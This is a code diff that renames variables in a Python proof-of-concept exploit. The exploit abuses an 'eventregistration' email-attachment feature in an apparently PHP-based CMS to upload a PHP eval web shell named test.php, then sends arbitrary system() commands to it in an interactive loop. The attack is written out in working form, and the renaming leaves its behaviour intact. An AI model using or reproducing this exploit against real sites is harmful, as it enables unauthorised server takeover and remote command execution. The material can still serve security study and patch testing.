@@ -15,9 +15,9 @@ def poc():
         # upload the shell
         url1 = target.url + "?module=eventregistration&action=emailRegistrants&email_addresses=123456789@123.com&email_message=1&email_subject=1"
         password = raw_input("[*] Please enter the shell-password:")
-        phpShell = "<?php eval($_POST['" + password + "']);?>"
+        shell_content = "<?php eval($_POST['" + password + "']);?>"
         shellName = "test.php"
-        payload = {'attach': (shellName, phpShell, 'multipart/form-data')}
+        payload = {'attach': (shellName, shell_content, 'multipart/form-data')}
         r = requests.post(url1, files=payload)
 
         # find the shell path
@@ -41,8 +41,8 @@ def poc():
                 command = raw_input("[*] input the command:")
                 payload = 'system("%s");' % command
                 if command != "exit":
-                    postData = {password: payload}
-                    r = requests.post(shell, data=postData)
+                    post_data = {password: payload}
+                    r = requests.post(shell, data=post_data)
                     print(r.text.encode(r.encoding))
                 else:
                     break
